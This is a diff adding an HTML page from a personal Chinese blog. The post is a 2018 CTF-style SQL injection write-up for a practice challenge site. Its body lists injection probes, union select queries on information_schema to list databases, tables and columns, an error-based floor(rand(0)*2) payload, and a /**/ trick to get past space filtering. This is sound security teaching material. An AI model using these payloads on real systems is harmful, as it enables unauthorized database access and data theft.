@@ -1,0 +1,164 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title> sql注入 - gravity的个人博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="GraVity0,"> 
+    <meta name="description" content="题目网址：http://daka.whaledu.com/webflag/index.php   
+预备知识：1.测试是否存在注入点：使用’测试是否存在注入点，如果页面显示与之前不同或者报错则存在注,"> 
+    <meta name="author" content="yuntao you"> 
+    <link rel="alternative" href="atom.xml" title="gravity的个人博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/first.jpg"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">gravity的个人博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle"> sql注入</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title"> sql注入</h1>
+        <div class="stuff">
+            <span>十一月 22, 2018</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>题目网址：<a href="http://daka.whaledu.com/webflag/index.php" target="_blank" rel="noopener">http://daka.whaledu.com/webflag/index.php</a>   </p>
+<h3 id="预备知识："><a href="#预备知识：" class="headerlink" title="预备知识："></a>预备知识：</h3><h5 id="1-测试是否存在注入点："><a href="#1-测试是否存在注入点：" class="headerlink" title="1.测试是否存在注入点："></a>1.测试是否存在注入点：</h5><p>使用’测试是否存在注入点，如果页面显示与之前不同或者报错则存在注入点。<br>使用and逻辑语句和’1’=’1/‘1’=’2 (1=1/1=2)进一步判断是否能够带入sql命令和注入类型。<br>使用order by N查询列数（方便union注入，报错则不需要）<br>使用select 1,2,…,N 查询回显位置（报错则不需要）<br>在带有回显的部分带入注入命令查询信息。<br>查询信息可以使用union select concat(database(),user(),version())等 </p>
+<h4 id="2-查询"><a href="#2-查询" class="headerlink" title="2.查询"></a>2.查询</h4><p>依次查询：数据库名-&gt;表名-&gt;列名-&gt;数据<br>union select table_schema from information_schema.tables where table_schema=database()数据库名<br>union select table_name from information_schema.tables where table_schema=database()表名<br>union select column_name from information_schema.columns where table_name=’table_name’列名<br>union select ‘column_name’ from(table_name)数据       </p>
+<h4 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h4><p>floor函数是一个下去整函数<br>rand(0)能够产生一个随机数<br>floor(rand(0)*2)能够产生0或者1的随机二值<br>count(*)+group by * 会对查询表格归类计数，相同值的列归一后计数加一。<br>concat()可以将两列值合并为一列select<br>select count(*),concat(floor(rand(0)*2),version())x from information_schema.tables group by x;<br>在临时表格生成时，数据库对于是否合并随机数0，1产生歧义而报错。<br>select count(*),concat(floor(rand(0)*2),database())x from information_schema.tables group by x;<br><a href="https://i.loli.net/2018/11/23/5bf7e03004331.jpg" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/23/5bf7e03004331.jpg" alt="98.jpg"></a><br>标志性语句Duplicate entry 其中’  ‘中的内容为随机数和真实存在的表名去掉随机数后就得到了表名。 </p>
+<h2 id="注：空格可以用-来代替。"><a href="#注：空格可以用-来代替。" class="headerlink" title="注：空格可以用/**/来代替。"></a>注：空格可以用/**/来代替。</h2><p>解题过程：<br><a href="http://note.youdao.com/noteshare?id=f21bc26bc36d3bd6fd016af21bbe8036&amp;sub=803447D8171049E592CC7569E948EF6E" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=f21bc26bc36d3bd6fd016af21bbe8036&amp;sub=803447D8171049E592CC7569E948EF6E</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#预备知识："><span class="toc-number">1.</span> <span class="toc-text">预备知识：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-测试是否存在注入点："><span class="toc-number">1.0.1.</span> <span class="toc-text">1.测试是否存在注入点：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-查询"><span class="toc-number">1.1.</span> <span class="toc-text">2.查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#floor报错注入"><span class="toc-number">1.2.</span> <span class="toc-text">floor报错注入</span></a></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#注：空格可以用-来代替。"><span class="toc-number"></span> <span class="toc-text">注：空格可以用/**/来代替。</span></a>
+        </li></div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"lift","width":200,"height":350},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
